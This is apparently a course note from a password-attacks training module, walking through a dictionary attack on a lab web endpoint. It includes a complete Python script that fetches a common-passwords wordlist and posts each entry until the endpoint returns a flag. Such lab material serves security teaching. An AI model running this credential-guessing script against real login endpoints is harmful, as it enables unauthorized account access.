
## Section 4 — Dictionary Attacks (password wordlist attack)

```markdown
# NOTE — Dictionary Attacks

## ID
511

## Module
Password Attacks

## Kind
notes

## Title
Section 4 — Dictionary Attacks (Wordlist Password Cracking)

## Description
Hands‑on dictionary attack against a web endpoint using a 500‑worst‑passwords wordlist from SecLists, demonstrating how common passwords are cracked in seconds.

## Tags
dictionary-attack, wordlist, python, seclists, credential-guessing

## Commands
- `python3 dictionary-solver.py`
- `cat << 'EOF' > dictionary-solver.py`
- `requests.get("https://raw.githubusercontent.com/.../500-worst-passwords.txt")`
- `requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})`
- `response.json()['flag']`

## What This Section Covers
This section demonstrates a dictionary attack against a web endpoint that expects a password. Instead of trying all possible combinations (brute force), the script downloads a curated list of the 500 worst, most common passwords and tries each one. This is dramatically faster than exhaustive brute force and succeeds if the target uses any weak or default password.

## Methodology
1. **Spawn the target instance** — note the IP and port.
2. **Create the Python script** `dictionary-solver.py` with the provided code.
3. **Update the `ip` and `port` variables** to match your target.
4. **Run the script** — it automatically downloads the wordlist from SecLists.
5. **Watch the output** — the script prints each attempted password, then stops and prints the flag when a match is found.

## Multi-step Workflow
```bash
cat << 'EOF' > dictionary-solver.py
import requests

ip = "154.57.164.64"   # Replace with your target IP
port = 32286           # Replace with your target port

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    print(f"Attempted password: {password}")
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
EOF

python3 dictionary-solver.py

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|login-brute-forcing]]  
← [[03-pin-cracking]] | [[05-hybrid-attacks]] →
<!-- AUTO-LINKS-END -->
